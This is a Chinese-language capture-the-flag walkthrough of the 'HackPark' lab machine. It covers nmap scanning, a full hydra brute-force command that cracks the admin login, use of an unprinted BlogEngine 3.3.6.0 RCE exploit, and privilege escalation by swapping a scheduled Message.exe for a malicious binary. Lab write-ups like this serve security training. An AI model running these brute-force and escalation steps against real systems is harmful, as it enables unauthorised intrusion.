# HackPark

nmap扫描

```shell
sudo nmap --min-rate 10000 -p- 10.10.249.228 -Pn

PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server

sudo nmap -sT -sV -sC -O -p80,3389 10.10.249.228 -Pn    

PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
|_http-title: hackpark | hackpark amusements
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2025-05-05T09:02:19
|_Not valid after:  2025-11-04T09:02:19
|_ssl-date: 2025-05-06T09:05:48+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: HACKPARK
|   NetBIOS_Domain_Name: HACKPARK
|   NetBIOS_Computer_Name: HACKPARK
|   DNS_Domain_Name: hackpark
|   DNS_Computer_Name: hackpark
|   Product_Version: 6.3.9600
|_  System_Time: 2025-05-06T09:05:43+00:00
```

打开网站，发现有一个登录页面，我们可以尝试暴力破解

```shell
#这里猜测用户名为admin

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.249.228 http-post-form "/Account/login.aspx/?ReturnURL=/admin/:__VIEWSTATE=DnlpisdcEUqH8j%2BTfHwjfnDiqpWvZZvmxcWNBlrQrlJ0gTi8DtDygLqnwxURvD%2Bv2x7r8%2BIqY7plW%2FB9%2F%2B1TCIusqtGzWTavZBOSk7Fi825NqviQO%2FZbRx0VAF2odAn7qI%2FfKbpiW2pIsAWRKscG8GQnRBi%2F66FVtA%2BI1TwJ%2F56KtKUGM5SqdLZyBFCcesv530RSS4MRMcNGBTaxXL7HJIOJCy3UHap3UzDkKHa9tXVDCvyThInDs%2BI3SWyb%2B7jP86CD8aLkUKdzisIe98PbT%2BPnyn0Zl5bIT%2BdW0XbJ34dgKcuH%2Fl0e4CkAWl3HhyPp0iJpd9lr9GyRZ6J%2FDac0pgdMscgS314MMbVNYD3QfNLWmF1E&__EVENTVALIDATION=wJzsRu%2Fe463twN5C%2FwqSx2kfipviAGnkKaRKvKYZNZwLpBcYUaDMZoGjfgtK%2B2dWVzdbRotUf482DZTGgKPL%2BqI0DOCt5kEfrkU48uoMF3H07kjaN1Ef8EVfYkCmvn4XO8p7ciLKz9D8rrXBchMmSg5DgxnVsUCjHpRStbIElV8VtXQr&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"

[80][http-post-form] host: 10.10.249.228   login: admin   password: 1qaz2wsx
```

成功得到密码

进入后台页面，发现该BlogEngine的版本为3.3.6.0，存在一个rce漏洞，按照脚本提示尝试利用

成功getshell

但看起来不太稳定，所以我们改为使用meterpreter

上传winpeas.exe进行信息搜集

```tex
 WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
    File Permissions: Everyone [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])
    System Scheduler Service Wrapper
```

我们对该服务具有写操作和创建操作，导航到该服务

看到一个名为Events的文件夹，进入看到一个日志文件，发现一个名为Message.exe的文件每半分钟就以管理员权限运行一次，导航到此处，尝试利用该文件

我们将我们的恶意文件替换掉message.exe，并设置好监听，一会就将拿到管理员权限



